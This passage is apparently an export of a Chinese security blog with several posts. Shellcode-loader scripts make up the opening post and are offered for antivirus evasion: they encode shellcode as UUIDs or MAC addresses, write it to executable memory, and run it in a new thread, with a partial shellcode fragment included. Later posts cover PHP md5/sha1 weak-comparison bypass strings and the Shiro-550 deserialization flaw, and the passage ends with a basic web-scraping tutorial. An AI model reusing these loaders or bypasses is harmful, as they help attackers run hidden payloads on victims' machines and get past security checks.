CreateThread(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.c_void_p(p), ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="number">0</span>), ctypes.pointer(ctypes.c_int(<span class="number">0</span>)))  <span class="comment"># 执行创建线程</span></span><br><span class="line">WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-<span class="number">1</span>))  <span class="comment"># 检测线程创建事件</span></span><br></pre></td></tr></table></figure>

<h1 id="加载器3-UUID写入内存（成功"><a href="#加载器3-UUID写入内存（成功" class="headerlink" title="加载器3-UUID写入内存（成功"></a>加载器3-UUID写入内存（成功</h1><p>注意，这里的环境要使用py2</p>
<p>发现了去年有大佬写的一篇文章，随后拖过来进行分析</p>
<p>UUID: 通用唯一标识符 ( Universally Unique Identifier ), 对于所有的UUID它可以保证在空间和时间上的唯一性. 它是通过MAC地址, 时间戳, 命名空间, 随机数, 伪随机数来保证生成ID的唯一性, 有着固定的大小( 128 bit ). 它的唯一性和一致性特点使得可以无需注册过程就能够产生一个新的UUID. UUID可以被用作多种用途, 既可以用来短时间内标记一个对象, 也可以可靠的辨别网络中的持久性对象.</p>
<p>python有根据十六进制字符串生成UUID的函数uuid.UUID()</p>
<p>其中值得注意的是，16个字节转换一个uid值，\x00是一个字节，当不满16个的时候，可以添加\x00补充字数。（我生成的补充三个就可以，倍数是56）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">scode = <span class="string">b&#x27;&#x27;&#x27;aaaaaa&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(scode)/<span class="number">16</span>)):</span><br><span class="line">     bytes_a = scode[i*<span class="number">16</span>:<span class="number">16</span>+i*<span class="number">16</span>]</span><br><span class="line">     b = uuid.UUID(bytes_le=bytes_a)</span><br><span class="line">     <span class="built_in">list</span>.append(<span class="built_in">str</span>(b))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>

<p>上面是一个将shellcode转为uuid的小脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid_list = []<span class="comment">#将shellcode转为uuid</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">16</span>):</span><br><span class="line">    cut_bytes = shellcode[i:i+<span class="number">16</span>]</span><br><span class="line">    uid = uuid.UUID(bytes_le=cut_bytes)</span><br><span class="line">    uuid_list.append(<span class="built_in">str</span>(uid))</span><br><span class="line"><span class="built_in">print</span>(uuid_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 <span class="comment">#定义返回类型</span></span><br><span class="line"></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(uuid_list)*<span class="number">16</span>), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))  <span class="comment">#申请内存，这里的内存必须是列表的十六倍</span></span><br><span class="line"></span><br><span class="line">ptr1 = ptr  <span class="comment">#定义了一个内存指针，指向写入的内存地点</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> uuid_list:</span><br><span class="line">    ctypes.windll.Rpcrt4.UuidFromStringA(j, ptr1)</span><br><span class="line">    ptr1 += <span class="number">16</span>  <span class="comment">#这里每写入一个uuid就控制指针移动16位，方便下次写入</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) <span class="comment">#创建线程然后运行</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="加载器4-MAC写入内存"><a href="#加载器4-MAC写入内存" class="headerlink" title="加载器4-MAC写入内存"></a>加载器4-MAC写入内存</h1><p>注意，这个我也用的是python2的环境</p>
<p>看到刚刚的大佬，下面有个推荐文章mac写入内存，也顺便弄过来研究一下。</p>
<p>MAC地址也叫物理地址、硬件地址，由网络设备制造商生产时烧录在网卡的EPROM一种闪存芯片，通常可以通过程序擦写。IP地址与MAC地址在计算机里都是以二进制表示的，IP地址是32位的，而MAC地址则是48位（6个字节）的 。</p>
<p><code>RtlEthernetAddressToStringA</code></p>
<p>该函数是<code>ntdll.dll库</code>的函数，可以把mac地址二进制格式转换为字符串表示。就两个参数，一个是二进制的mac地址，一个是缓冲区的指针，在该缓冲区中存储以NULL结尾的以太网地址字符串表示。此缓冲区应足够大以容纳至少18个字符串。</p>
<p>下面是一个加密脚本，将shellcode加密成mac地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">buf = <span class="string">b&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8...&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = buf</span><br><span class="line">macmem = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(shellcode)/<span class="number">6</span>*<span class="number">17</span>,<span class="number">0x3000</span>,<span class="number">0x40</span>)<span class="comment">#由于我们转换成mac后，6个字节变成了17个字节，所以需内存大小自己算一下</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)/<span class="number">6</span>):<span class="comment">#然后每隔六个字节进行一次转换，此时内存地址递增17</span></span><br><span class="line">     bytes_a = shellcode[i*<span class="number">6</span>:<span class="number">6</span>+i*<span class="number">6</span>]</span><br><span class="line">     ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_a, macmem+i*<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line">a = ctypes.string_at(macmem, <span class="built_in">len</span>(shellcode) * <span class="number">3</span> - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)/<span class="number">6</span>):<span class="comment">#将mac地址字符串转换成列表</span></span><br><span class="line">    d = ctypes.string_at(macmem+i*<span class="number">17</span>,<span class="number">17</span>)</span><br><span class="line">    <span class="built_in">list</span>.append(d)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure>

<p>这里是加载器，加载好mac地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>)*<span class="number">6</span>,<span class="number">0x3000</span>,<span class="number">0x04</span>) <span class="comment">#申请内存</span></span><br><span class="line"></span><br><span class="line">rwxpage = ptr <span class="comment">#指正</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">list</span>)):</span><br><span class="line">    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(<span class="built_in">list</span>[i], <span class="built_in">list</span>[i], rwxpage)<span class="comment">#通过RtlEthernetStringToAddressA函数，将mac值转为二进制写入内存</span></span><br><span class="line">    rwxpage += <span class="number">6</span><span class="comment">#控制指正移位</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualProtect(ptr, <span class="built_in">len</span>(<span class="built_in">list</span>)*<span class="number">6</span>, <span class="number">0x40</span>, ctypes.byref(ctypes.c_long(<span class="number">1</span>)))<span class="comment">#创建线程然后混淆就可以了</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ptr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>目前就找到这么多，如果后续有还会更新的。</p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>sha1和md5绕过</title>
    <url>/2021/12/27/sha1%E5%92%8Cmd5%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>sha1和md5这两个加密函数无法处理数组<br>可用数组让两个数据内容不同但是加密之后都返回false</p>
<p>还有一种绕过方法md5的</p>
<p>$str1 = $_GET[‘str1’];<br>$str2 = $_GET[‘str2’];<br>if (md5($str1) == md5($str2)){<br>die(‘OK’); }</p>
<p>php弱类型比较产生的漏洞</p>
<p>想要满足这个判断只需要构造出MD5值为0e开头的字符串，这样的话弱类型比较会认为是科学技术法，0的多少次方都是0，因此可以绕过<br>有一些字符串的MD5值为0e开头，这里记录一下</p>
<p>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>还有MD5和双MD5以后的值都是0e开头的</p>
<p>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>shiro550漏洞分析</title>
    <url>/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="shiro550漏洞分析"><a href="#shiro550漏洞分析" class="headerlink" title="shiro550漏洞分析"></a>shiro550漏洞分析</h1><p>今天来仔细研究一下这个漏洞</p>
<p>环境搭建暂时就不说了，这个可以在网上找教程，直接开始漏洞分析，祝福。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>漏洞产生点在<code>CookieRememberMeManager</code>该位置，来看到<code>rememberSerializedIdentity</code>方法。</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206134650560.png" alt="image-20240206134650560"><br>在此处，对序列化的字节数组进行base64编码，并将编码结果设置为cookie值。那我们看看是什么地方调用了这个方法.</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206140748579.png" alt="image-20240206140748579"><br>点这个2个用法,这样就可以看到是在哪里用了这个方法.<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206140835289.png" alt="image-20240206140835289"><br>可以看到是AbstractRememberMeManager类里面调用了这个方法</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206141831432.png" alt="image-20240206141831432"><br>还可以用ctrl+alt+h来看是哪些东西调用了这个方法<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144038527.png" alt="image-20240206144038527">在这里会发现<code>rememberIdentity</code>方法会被<code>onSuccessfulLogin</code>方法给调用，跟踪到这一步，就看到了<code>onSuccessfulLogin</code>登录成功的方法。</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144121521.png" alt="image-20240206144121521"></p>
<p>当登录成功后会调用<code>AbstractRememberMeManager.onSuccessfulLogin</code>方法，该方法主要实现了生成加密的<code>RememberMe Cookie</code>,然后将<code>RememberMe Cookie</code>设置为用户的Cookie值。在前面我们分析的<code>rememberSerializedIdentity</code>方法里面去实现了。</p>
<p>接下来，我们在这个登陆函数这里打个断点，进行分析，正向的。<br>开始环境，然后输入账号密码，root,secret<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144748667.png" alt="image-20240206144748667"><br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144807380.png" alt="image-20240206144807380"><br>idea里面都可以看到穿进去了<br>这里看到调用了<code>isRememberMe</code>很显而易见得发现这个就是一个判断用户是否选择了<code>Remember Me</code>选项。<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144910533.png" alt="image-20240206144910533"><br>这里进入这个rememberIdentity方法</p>
<p>前面说过该方法会去生成一个<code>PrincipalCollection</code>对象，里面包含登录信息。F7进行跟进<code>rememberIdentity</code>方法。<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206144958818.png" alt="image-20240206144958818"></p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206145025830.png" alt="image-20240206145025830"><br>查看convertPrincipalsToBytes的使用，根据英文名字，我们都可以猜测，这个点作用就是将凭证转化为字节流，不过我们还是跟进去看看<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150300541.png" alt="image-20240206150300541"><br>跟进来看之后，发现是将凭证序列化之后，再进行转字节流数组。</p>
<p>这里我们接下来看另外一个地方，cipherService<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150612234.png" alt="image-20240206150612234"><br>再来看到下一段代码，这里如果<code>getCipherService</code>方法不为空的话，就会去执行下一段代码。<code>getCipherService</code>方法是获取加密模式。</p>
<p>后面就是进行加密了<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150707538.png" alt="image-20240206150707538"><br>我们跟入这个加密参数来看看<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150750007.png" alt="image-20240206150750007"><br>可以看到，如果值不为空就进入加密。</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150842156.png" alt="image-20240206150842156"><br>这里，有个<code>getEncryptionCipherKey()</code>从名字看，就是获取加密密钥的，我们这里就跟进去看看，是怎么获取密钥的。<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206150929704.png" alt="image-20240206150929704"><br>然后看下面哈<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206152218420.png" alt="image-20240206152218420"><br>看，下面那个<code>setEncryptionCipherKey</code>在AbstractRememberMeManager.java的AbstractRememberMeManager方法中被调用了。<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206152349191.png" alt="image-20240206152349191"><br>然后去查看这个<code>DEFAULT_CIPHER_KEY_BYTES</code>的值<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206152424668.png" alt="image-20240206152424668"><br>可以看到，密钥是被定义死的，那么加密过程基本就很清晰了</p>
<p>凭证等值-&gt;tobytes-&gt;aes-&gt;base64</p>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>现在看看解密的过程</p>
<p><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206235351390.png" alt="image-20240206235351390"><br>还是在AbstractRememberMeManager.decrypt中，一层一层网上追溯。<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206235516557.png" alt="image-20240206235516557"><br>在convertBytesToPrincipals方法中使用了解密方法,继续网上追溯<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240206235707082.png" alt="image-20240206235707082"><br>在这个getRememberedPrincipals方法中调用了convertBytesToPrincipals方法，从名字我们就可以看出，这个getRememberedPrincipals是获取登陆凭证的一个函数</p>
<p>好，那我们就在这个方法中下一个断点，一步一步跟踪。</p>
<p><img src="file://C:/Users/24205/Desktop/day1%E7%BA%A2%E9%98%9F%E8%AF%BE/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E8%B5%84%E6%96%99/1-Shiro/assets/image-20220902000758049.png?lastModify=1707235646" alt="image-20220902000758049"></p>
<p>首先rememberme传进来之后，就会进行base解密，之后和加密差不多，最后就是传入readObject()导致的反序列化漏洞。</p>
<h1 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h1><p>就用工具即可<br><img src="/2024/02/07/shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20240207001003892.png" alt="image-20240207001003892"></p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>py爬虫-入门（b站课程）</title>
    <url>/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/</url>
    <content><![CDATA[<h1 id="py爬虫-b站课程（入门的知识和基础的应用）"><a href="#py爬虫-b站课程（入门的知识和基础的应用）" class="headerlink" title="py爬虫-b站课程（入门的知识和基础的应用）"></a>py爬虫-b站课程（入门的知识和基础的应用）</h1><h1 id="1-初识requests模块"><a href="#1-初识requests模块" class="headerlink" title="1.初识requests模块"></a>1.初识requests模块</h1><h2 id="1-1分类"><a href="#1-1分类" class="headerlink" title="1.1分类"></a>1.1分类</h2><p>通用爬虫：抓取的是一整张页面数据</p>
<p>聚焦爬虫：抓取的是页面中特定的局部内容</p>
<p>增量式爬虫：只会抓取网站中最新更新出来的数据，</p>
<h2 id="1-2http和https"><a href="#1-2http和https" class="headerlink" title="1.2http和https"></a>1.2http和https</h2><h3 id="1-2-1http协议"><a href="#1-2-1http协议" class="headerlink" title="1.2.1http协议"></a>1.2.1http协议</h3><p>就是服务器和客户端交互的一种形式</p>
<h4 id="1-2-1-1常用的请求头信息"><a href="#1-2-1-1常用的请求头信息" class="headerlink" title="1.2.1.1常用的请求头信息"></a>1.2.1.1常用的请求头信息</h4><p>User-Agent:请求载体的身份标识</p>
<p>Connection:请求完毕后，是断开连接还是保持连接。close/keep alive</p>
<h4 id="1-2-1-2常用的响应头信息"><a href="#1-2-1-2常用的响应头信息" class="headerlink" title="1.2.1.2常用的响应头信息"></a>1.2.1.2常用的响应头信息</h4><p>Content-Type:服务器响应回客户端的数据类型</p>
<h3 id="1-2-2https"><a href="#1-2-2https" class="headerlink" title="1.2.2https"></a>1.2.2https</h3><p>安全的超文本传输协议，就是加密之后的http</p>
<p>加密方式：</p>
<p>·对称秘钥加密</p>
<p>·非对称秘钥加密</p>
<p>·证书秘钥加密</p>
<h1 id="2-requests模块"><a href="#2-requests模块" class="headerlink" title="2.requests模块"></a>2.requests模块</h1><h2 id="2-1如何使用"><a href="#2-1如何使用" class="headerlink" title="2.1如何使用"></a>2.1如何使用</h2><p>·指定url</p>
<p>·发起请求</p>
<p>·获取响应数据</p>
<p>·持久化存储</p>
<p>示例1：百度页面的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;https://baidu.com/&#x27;</span></span><br><span class="line">res = requests.get(url) <span class="comment">#使用get请求</span></span><br><span class="line"><span class="comment">#返回一个字符串</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h2 id="2-2根据案例开始深入学习"><a href="#2-2根据案例开始深入学习" class="headerlink" title="2.2根据案例开始深入学习"></a>2.2根据案例开始深入学习</h2><h3 id="简易的网易采集器（根据关键字在搜索引擎中搜索）"><a href="#简易的网易采集器（根据关键字在搜索引擎中搜索）" class="headerlink" title="简易的网易采集器（根据关键字在搜索引擎中搜索）"></a>简易的网易采集器（根据关键字在搜索引擎中搜索）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">key = <span class="built_in">input</span>()</span><br><span class="line">param = &#123;<span class="string">&#x27;query&#x27;</span>:key&#125;<span class="comment">#可以吧参数封装到字典中</span></span><br><span class="line">url = <span class="string">f&#x27;https://www.sogou.com/web&#x27;</span><span class="comment">#这里的网址是经过简单处理的，观察url就可以发现，关键字在query参数后面。</span></span><br><span class="line"><span class="comment">#ua伪装</span></span><br><span class="line"><span class="comment">#注意这个handers必须是一个字典的形式</span></span><br><span class="line">user_agent = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#使用requests的时候用params参数来增加参数</span></span><br><span class="line">res = requests.get(url,params=param,headers=user_agent)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h3 id="破解百度翻译"><a href="#破解百度翻译" class="headerlink" title="破解百度翻译"></a>破解百度翻译</h3><p>知识：阿贾克斯请求，AJAX 是一种<strong>用于创建快速动态网页的技术</strong>。</p>
<p><strong>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着</strong>可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>百度翻译每一次翻译都会刷新页面，那我们找到对应的ajax请求就可以了</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122161431973.png" alt="image-20220122161431973"></p>
<p>在分类中的xhr中就是ajax请求的分类。</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122162410799.png" alt="image-20220122162410799"></p>
<p>把他的请求地址作为我们爬虫的请求地址</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122162443268.png" alt="image-20220122162443268"></p>
<p>记住方法是post，我们的请求方法就要变成requests.post,</p>
<p>payload里面只有一个参数kw，我们要在请求的时候加入数据kw<code>data = &#123;&#39;kw&#39;:f&#39;&#123;key&#125;&#39;&#125;</code>记住也是字典模式</p>
<p>响应回来的数据是json数据，我们应该调用json方法返回（返回的是一个字典）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">key = <span class="built_in">input</span>()</span><br><span class="line">url = <span class="string">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class="line">handers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line">data = &#123;<span class="string">&#x27;kw&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span>&#x27;</span>&#125;</span><br><span class="line">res = requests.post(url,headers=handers,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.json())</span><br><span class="line"><span class="comment">#进行持久化存储</span></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">f&#x27;./<span class="subst">&#123;key&#125;</span>.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json.dump(res.json(),fp = fp,ensure_ascii=<span class="literal">False</span>)<span class="comment">#把数据结构转换成json，因为有中文所以不能用ASCII编码。</span></span><br></pre></td></tr></table></figure>

<h3 id="爬取豆瓣"><a href="#爬取豆瓣" class="headerlink" title="爬取豆瓣"></a>爬取豆瓣</h3><p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122165018639.png" alt="image-20220122165018639"></p>
<p>每一次页面滑到底部的时候，就会出现新的电影，url没有变，那就是阿贾克斯请求，在页面抓包工具中找包</p>
<p><img src="/2022/01/27/py%E7%88%AC%E8%99%AB-%E5%85%A5%E9%97%A8%EF%BC%88b%E7%AB%99%E8%AF%BE%E7%A8%8B%EF%BC%89/image-20220122165119672.png" alt="image-20220122165119672"></p>
<p>就这一个，是get请求，参数在payload里面去看，记下请求的url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;你先要几部恐怖片&quot;</span>)</span><br><span class="line">url = <span class="string">&#x27;https://movie.douban.com/j/chart/top_list?&#x27;</span></span><br><span class="line"><span class="comment">#记住参数要封装在字典中</span></span><br><span class="line">param = &#123;<span class="string">&#x27;type&#x27;</span>:<span class="string">&#x27;20&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;interval_id&#x27;</span>:<span class="string">&#x27;100:90&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;start&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,<span class="comment">#分析一下我们知道是从第几个电影开始取</span></span><br><span class="line">        <span class="string">&#x27;limit&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;num&#125;</span>&#x27;</span>&#125;<span class="comment">#限制取几个电影</span></span><br><span class="line"></span><br><span class="line">handers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers=handers,params=param)</span><br><span class="line"><span class="built_in">print</span>(res.json())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./恐怖电影.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    json.dump(res.json(),fp=fp,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我又优化了一下，可以选种类，指定电影的数量，输出的时候只输出名字和网址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[[&#x27;纪录片&#x27;, &#x27;音乐&#x27;, 1], [&#x27;剧情&#x27;, &#x27;传记&#x27;, &#x27;历史&#x27;, 2], [&#x27;犯罪&#x27;, &#x27;剧情&#x27;, 3], [&#x27;剧情&#x27;, &#x27;历史&#x27;, &#x27;战争&#x27;, 4], [&#x27;喜剧&#x27;, &#x27;动作&#x27;, &#x27;爱情&#x27;, 5], [&#x27;剧情&#x27;, &#x27;战争&#x27;, &#x27;情色&#x27;, 6], [&#x27;剧情&#x27;, &#x27;歌舞&#x27;, 7]]</span></span><br><span class="line"><span class="string">[[&#x27;剧情&#x27;, &#x27;犯罪&#x27;, &#x27;悬疑&#x27;, 10], [&#x27;犯罪&#x27;, &#x27;剧情&#x27;, 11], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;灾难&#x27;, 12], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;同性&#x27;, 13], [&#x27;音乐&#x27;, 14], [&#x27;剧情&#x27;, &#x27;科幻&#x27;, &#x27;冒险&#x27;, 15],</span></span><br><span class="line"><span class="string"> [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, 16], [&#x27;剧情&#x27;, &#x27;科幻&#x27;, &#x27;冒险&#x27;, 17], [&#x27;运动&#x27;, 18], [&#x27;剧情&#x27;, &#x27;犯罪&#x27;, &#x27;惊悚&#x27;, 19]],[[&#x27;悬疑&#x27;, &#x27;惊悚&#x27;, &#x27;恐怖&#x27;, 20]]</span></span><br><span class="line"><span class="string">[[&#x27;剧情&#x27;, &#x27;喜剧&#x27;, &#x27;爱情&#x27;, &#x27;战争&#x27;, 22], [&#x27;科幻&#x27;, &#x27;动画&#x27;, &#x27;短片&#x27;, 23], [&#x27;剧情&#x27;, &#x27;喜剧&#x27;, &#x27;爱情&#x27;, &#x27;战争&#x27;, 24], [&#x27;剧情&#x27;, &#x27;动画&#x27;, &#x27;奇幻&#x27;, 25], [&#x27;剧情&#x27;, &#x27;爱情&#x27;, &#x27;同性&#x27;, 26], [&#x27;冒险&#x27;, &#x27;西部&#x27;, 